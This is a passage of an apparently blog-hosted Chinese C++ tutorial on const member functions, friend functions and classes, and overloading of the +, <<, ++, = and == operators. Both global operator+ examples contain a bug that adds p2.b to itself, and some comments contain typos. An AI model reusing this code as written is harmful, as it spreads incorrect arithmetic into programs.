class="hljs-comment">//会报错，因为这个const将this指针变成const person * const this这样左值就不可修改了</span><br>          <span class="hljs-comment">//在成员函数后加const，修饰的是this指针，让指针指向的值也不可被修改</span><br>&#125;<br>     <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function">     </span>&#123;<br>          <br>     &#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>person p;<br>p.<span class="hljs-built_in">showperson</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-type">const</span> person p;<br>     p.a=<span class="hljs-number">100</span>;<span class="hljs-comment">//报错，也不可修改属性，但加mutable就可以修改了</span><br>     p.<span class="hljs-built_in">showperson</span>();<br>     p.<span class="hljs-built_in">show</span>();<span class="hljs-comment">//会报错，不可调用普通成员函数，因为普通成员函数可以修改属性，与常对象矛盾</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="调用规则"><a href="#调用规则" class="headerlink" title="调用规则"></a>调用规则</h4><ul><li><strong><code>const</code> 成员函数</strong> 可以被 <code>const</code> 对象调用，也可以被非 <code>const</code> 对象调用（但优先调用非 <code>const</code> 版本）。<br>  <strong>非</strong></li><li>** <code>const</code> 成员函数** 只能被非 <code>const</code> 对象调用。</li><li><strong><code>const</code> 可以用来区分重载函数</strong>，只要它们的参数列表相同，但 <code>const</code> 属性不同。</li></ul><h2 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h2><p>在程序里，有些私有属性，也想让类外的一些特殊的函数或类进行访问，需要用到友元</p><p>关键字：<strong>friend</strong></p><ul><li>三种实现<ul><li>全局函数做友元</li><li>类做友元</li><li>成员函数做友元</li></ul></li></ul><h3 id="全局函数做友元"><a href="#全局函数做友元" class="headerlink" title="全局函数做友元"></a>全局函数做友元</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">room</span><br>&#123;<br><span class="hljs-function"><span class="hljs-keyword">friend</span> <span class="hljs-type">void</span> <span class="hljs-title">gfriend</span><span class="hljs-params">(room* r)</span></span>;<span class="hljs-comment">//实现友元，这样公有和私有都可以访问了</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">room</span>()<br>&#123;<br>sroom = <span class="hljs-string">&quot;a&quot;</span>;<br>bedroom = <span class="hljs-string">&quot;b&quot;</span>;<br>&#125;<br><span class="hljs-keyword">public</span>:<br>string sroom;<br><span class="hljs-keyword">private</span>:<br>string bedroom;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">gfriend</span><span class="hljs-params">(room* r)</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;全局函数访问：&quot;</span> &lt;&lt; r-&gt;sroom &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;全局函数访问：&quot;</span> &lt;&lt; r-&gt;bedroom &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>room rr;<br><span class="hljs-built_in">gfriend</span>(&amp;rr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="类做友元"><a href="#类做友元" class="headerlink" title="类做友元"></a>类做友元</h3><p>让一个类可以访问另一个类的私有成员</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">room</span><br>&#123;<br><span class="hljs-keyword">friend</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">gfriend</span>;<span class="hljs-comment">//实现类做友元</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">room</span>();<br><span class="hljs-keyword">public</span>:<br>string sroom;<br><span class="hljs-keyword">private</span>:<br>string bedroom;<br>&#125;;<br>room::<span class="hljs-built_in">room</span>()<span class="hljs-comment">//类外实现构造函数</span><br>&#123;<br>sroom = <span class="hljs-string">&quot;a&quot;</span>;<br>bedroom = <span class="hljs-string">&quot;b&quot;</span>;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">gfriend</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>room* r;<br><span class="hljs-built_in">gfriend</span>()<br>&#123;<br>r = <span class="hljs-keyword">new</span> room;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">visit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;gfriend正在访问：&quot;</span> &lt;&lt; r-&gt;sroom &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;gfriend正在访问：&quot;</span> &lt;&lt; r-&gt;bedroom &lt;&lt; endl;<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>gfriend gg;<br>gg.<span class="hljs-built_in">visit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="成员函数做友元"><a href="#成员函数做友元" class="headerlink" title="成员函数做友元"></a>成员函数做友元</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">room</span>; <span class="hljs-comment">// 前向声明</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">gfriend</span> <br>&#123;<br><span class="hljs-keyword">public</span>:<br>    room* r;<br>    <span class="hljs-built_in">gfriend</span>();<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">visit</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">// 先声明成员函数</span><br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">room</span> <br>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">friend</span> <span class="hljs-type">void</span> <span class="hljs-title">gfriend::visit</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">// 此时 gfriend 类已定义，实现友元</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">room</span>();<br>    string sroom;<br><span class="hljs-keyword">private</span>:<br>    string bedroom;<br>&#125;;<br><br><span class="hljs-comment">// 类成员函数的实现</span><br>room::<span class="hljs-built_in">room</span>() <br>&#123;<br>    sroom = <span class="hljs-string">&quot;a&quot;</span>;<br>    bedroom = <span class="hljs-string">&quot;b&quot;</span>;<br>&#125;<br><br>gfriend::<span class="hljs-built_in">gfriend</span>() <br>&#123;<br>    r = <span class="hljs-keyword">new</span> room;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">gfriend::visit</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;gfriend正在访问：&quot;</span> &lt;&lt; r-&gt;sroom &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;gfriend正在访问：&quot;</span> &lt;&lt; r-&gt;bedroom &lt;&lt; endl; <span class="hljs-comment">// 现在可以访问私有成员</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>    gfriend gg;<br>    gg.<span class="hljs-built_in">visit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h2><p>对运算符重新进行定义，赋予其另一种功能，以适应不同的数据类型</p><h3 id="加号运算符重载"><a href="#加号运算符重载" class="headerlink" title="加号运算符重载"></a>加号运算符重载</h3><p>作用：实现自定义数据类型的运算</p><h4 id="成员函数重载加号"><a href="#成员函数重载加号" class="headerlink" title="成员函数重载加号"></a>成员函数重载加号</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> a;<br><span class="hljs-type">int</span> b;<br>person <span class="hljs-keyword">operator</span>+(person&amp; p)<br>&#123;<br>person temp;<br>temp.a = a + p.a;<br>temp.b = b + p.b;<br><span class="hljs-keyword">return</span> temp;<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>person p1;<br>p<span class="hljs-number">1.</span>a = <span class="hljs-number">10</span>;<br>p<span class="hljs-number">1.</span>b = <span class="hljs-number">10</span>;<br>person p2;<br>p<span class="hljs-number">2.</span>a = <span class="hljs-number">10</span>;<br>p<span class="hljs-number">2.</span>b = <span class="hljs-number">10</span>;<br>person p3 = p1 + p2;<br>     <span class="hljs-comment">//本质p3=p1.operator+(p2);简化为上面的写法</span><br>cout &lt;&lt; <span class="hljs-string">&quot;p3.a=&quot;</span> &lt;&lt; p<span class="hljs-number">3.</span>a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;p3.b=&quot;</span> &lt;&lt; p<span class="hljs-number">3.</span>b &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="全局函数重载加号"><a href="#全局函数重载加号" class="headerlink" title="全局函数重载加号"></a>全局函数重载加号</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> a;<br><span class="hljs-type">int</span> b;<br>&#125;;<br>person <span class="hljs-keyword">operator</span>+(person&amp; p1, person&amp; p2)<br>&#123;<br>person temp;<br>temp.a = p<span class="hljs-number">1.</span>a + p<span class="hljs-number">2.</span>a;<br>temp.b = p<span class="hljs-number">2.</span>b + p<span class="hljs-number">2.</span>b;<br><span class="hljs-keyword">return</span> temp;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>person p1;<br>p<span class="hljs-number">1.</span>a = <span class="hljs-number">10</span>;<br>p<span class="hljs-number">1.</span>b = <span class="hljs-number">10</span>;<br>person p2;<br>p<span class="hljs-number">2.</span>a = <span class="hljs-number">10</span>;<br>p<span class="hljs-number">2.</span>b = <span class="hljs-number">10</span>;<br>person p3 = p1 + p2;<br><span class="hljs-comment">//本质p3=operatoe(p1,p2)简化为上面的写法</span><br>cout &lt;&lt; <span class="hljs-string">&quot;p3.a=&quot;</span> &lt;&lt; p<span class="hljs-number">3.</span>a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;p3.b=&quot;</span> &lt;&lt; p<span class="hljs-number">3.</span>b &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="运算符重载发生函数重载"><a href="#运算符重载发生函数重载" class="headerlink" title="运算符重载发生函数重载"></a>运算符重载发生函数重载</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> a;<br><span class="hljs-type">int</span> b;<br>&#125;;<br>person <span class="hljs-keyword">operator</span>+(person&amp; p1, person&amp; p2)<br>&#123;<br>person temp;<br>temp.a = p<span class="hljs-number">1.</span>a + p<span class="hljs-number">2.</span>a;<br>temp.b = p<span class="hljs-number">2.</span>b + p<span class="hljs-number">2.</span>b;<br><span class="hljs-keyword">return</span> temp;<br>&#125;<br>person <span class="hljs-keyword">operator</span>+(person&amp; p1, <span class="hljs-type">int</span> n)<br>&#123;<br>person temp;<br>temp.a = p<span class="hljs-number">1.</span>a + n;<br>temp.b = p<span class="hljs-number">1.</span>b + n;<br><span class="hljs-keyword">return</span> temp;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>person p1;<br>p<span class="hljs-number">1.</span>a = <span class="hljs-number">10</span>;<br>p<span class="hljs-number">1.</span>b = <span class="hljs-number">10</span>;<br>person p2;<br>p<span class="hljs-number">2.</span>a = <span class="hljs-number">10</span>;<br>p<span class="hljs-number">2.</span>b = <span class="hljs-number">10</span>;<br>person p3 = p1 + p2;<br>person p4 = p1 + <span class="hljs-number">20</span>;<br><span class="hljs-comment">//本质p3=operatoe(p1,p2)简化为上面的写法</span><br>cout &lt;&lt; <span class="hljs-string">&quot;p3.a=&quot;</span> &lt;&lt; p<span class="hljs-number">3.</span>a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;p3.b=&quot;</span> &lt;&lt; p<span class="hljs-number">3.</span>b &lt;&lt; endl;<br>cout &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;p4.a=&quot;</span> &lt;&lt; p<span class="hljs-number">4.</span>a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;p4.b=&quot;</span> &lt;&lt; p<span class="hljs-number">4.</span>b &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>总结1：对于内置的数据类型的表达式的运算符不能重载</p><p>总结2：不要滥用运算符重载（把加法写成减法等等）</p></blockquote><h3 id="左移运算符重载"><a href="#左移运算符重载" class="headerlink" title="左移运算符重载"></a>左移运算符重载</h3><p>作用：输出自定义数据类型<code>&lt;&lt;</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br>     <span class="hljs-keyword">friend</span> ostream&amp; <span class="hljs-keyword">operator</span>&lt;&lt;(ostream&amp; cout, person&amp; p);<br>     <span class="hljs-function"><span class="hljs-keyword">friend</span> <span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-comment">//成员函数重载</span><br>    <span class="hljs-comment">//void operator&lt;&lt;(cout)</span><br>    <span class="hljs-comment">//&#123;   </span><br>    <span class="hljs-comment">//&#125;</span><br>    <span class="hljs-comment">//一般不会用成员函数重载&lt;&lt;，应为无法实现cout在左侧</span><br><span class="hljs-keyword">private</span>:<span class="hljs-comment">//一般设置为私有，所以要设置友元</span><br>    <span class="hljs-type">int</span> a;<br>    <span class="hljs-type">int</span> b;<br>&#125;;<br><span class="hljs-comment">//只能利用全局函数重载左移运算符</span><br>ostream&amp; <span class="hljs-keyword">operator</span>&lt;&lt;(ostream&amp; cout, person&amp; p)<span class="hljs-comment">//本质 operator&lt;&lt;(cout,p)，简化后cout&lt;&lt;p</span><br>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;a=&quot;</span> &lt;&lt; p.a &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;b=&quot;</span> &lt;&lt; p.b &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> cout;<span class="hljs-comment">//这样就能继续输出endl，否则只能cout&lt;&lt;p;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    person p;<br>    p.a = <span class="hljs-number">10</span>;<br>    p.b = <span class="hljs-number">10</span>;<br>    cout &lt;&lt; p &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="递增运算符重载"><a href="#递增运算符重载" class="headerlink" title="递增运算符重载"></a>递增运算符重载</h3><p>实现前置递增和后置递增</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br>    <span class="hljs-keyword">friend</span> ostream&amp; <span class="hljs-keyword">operator</span>&lt;&lt;(ostream&amp; cout,<span class="hljs-type">const</span> person&amp; p);<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">person</span>()<br>    &#123;<br>        a = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">//重载前置++</span><br>    person&amp; <span class="hljs-keyword">operator</span>++()<br>    &#123;<br>        a++;<br>        <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<span class="hljs-comment">//不能返回值，否则是拷贝，两次++不会更改原本的值，返回引用是为了一直对一个数据做递增</span><br>    &#125;<br>    <span class="hljs-comment">//重载后置++</span><br>    person <span class="hljs-keyword">operator</span>++(<span class="hljs-type">int</span>)<span class="hljs-comment">//int是占位参数，用来区分前置和后置</span><br>    &#123;<br>        person temp = *<span class="hljs-keyword">this</span>;<br>        a++;<br>        <span class="hljs-keyword">return</span> temp;<span class="hljs-comment">//这时返回的是值而不是引用，因为这是对局部变量的引用，会报错</span><br>    &#125;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> a;<br>&#125;;<br>ostream&amp; <span class="hljs-keyword">operator</span>&lt;&lt;(ostream&amp; cout,<span class="hljs-type">const</span> person&amp; p)<span class="hljs-comment">//要加const，否则不能接收临时对象，也就是p+</span><br>&#123;<br>    cout &lt;&lt; p.a;<br>    <span class="hljs-keyword">return</span> cout;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    person p;<br>    cout &lt;&lt; p &lt;&lt; endl;<br>    cout &lt;&lt; ++p &lt;&lt; endl;<br>    cout &lt;&lt; p &lt;&lt; endl;<br>    cout &lt;&lt; p++ &lt;&lt; endl;<br>    cout &lt;&lt; p;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结：<strong>前置递增返回的是引用，后置递增返回的是值</strong></p><h3 id="赋值运算符重载"><a href="#赋值运算符重载" class="headerlink" title="赋值运算符重载"></a>赋值运算符重载</h3><p>C++至少给一个类添加4个函数</p><ul><li>默认构造函数</li><li>默认析构函数</li><li>默认拷贝函数</li><li>赋值运算符<code>operator=</code>，对属性进行值拷贝</li></ul><p>如果有属性指向堆区，也会出现深浅拷贝的问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">person</span>(<span class="hljs-type">int</span> ag)<br>    &#123;<br>        age = <span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>(ag);<br>    &#125;<br>    ~<span class="hljs-built_in">person</span>()<br>    &#123;<br>        <span class="hljs-keyword">if</span> (age != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-keyword">delete</span> age;<br>            age = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//重载赋值运算符</span><br>    person&amp; <span class="hljs-keyword">operator</span>=(person&amp; p)<br>    &#123;<br>        <span class="hljs-comment">//编译器提供的是浅拷贝，我们要写的是深拷贝</span><br>        <span class="hljs-comment">//先判断是否有属性在堆上，如果有的话先释放干净</span><br>        &#123;<br>            <span class="hljs-keyword">if</span> (age != <span class="hljs-literal">NULL</span>)<br>            &#123;<br>                <span class="hljs-keyword">delete</span> age;<br>                age = <span class="hljs-literal">NULL</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//深拷贝</span><br>        age = <span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>(*p.age);<br>        <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<span class="hljs-comment">//可以进行连等，p3=p2=p1;</span><br>    &#125;<br>    <span class="hljs-type">int</span>* age;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function">person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">18</span>)</span></span>;<br>    <span class="hljs-function">person <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-number">20</span>)</span></span>;<br>    <span class="hljs-function">person <span class="hljs-title">p3</span><span class="hljs-params">(<span class="hljs-number">22</span>)</span></span>;<br>    p3 = p2 = p1;<br>    cout &lt;&lt; <span class="hljs-string">&quot;p1=&quot;</span> &lt;&lt; *p<span class="hljs-number">1.</span>age &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;p2=&quot;</span> &lt;&lt; *p<span class="hljs-number">2.</span>age &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;p3=&quot;</span> &lt;&lt; *p<span class="hljs-number">3.</span>age &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="关系运算符重载"><a href="#关系运算符重载" class="headerlink" title="关系运算符重载"></a>关系运算符重载</h3><p>作用：可以让两个自定义数据类型可以进行比较</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">person</span>(<span class="hljs-type">int</span> a)<br>&#123;<br>age=a;<br>&#125;<br><span class="hljs-type">int</span> age;<br><span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>==(person&amp; p)<br>&#123;<br><span class="hljs-keyword">if</span> (age==p.age)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">18</span>)</span></span>;<br><span class="hljs-function">person <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-number">18</span>)</span></span>;<br><span class="hljs-keyword">if</span> (p1==p2)<br>cout&lt;&lt;<span class="hljs-string">&quot;p1与p2相等&quot;</span>&lt;&lt;endl;<br>     <span class="hljs-keyword">else</span><br>          cout&lt;&lt;<span 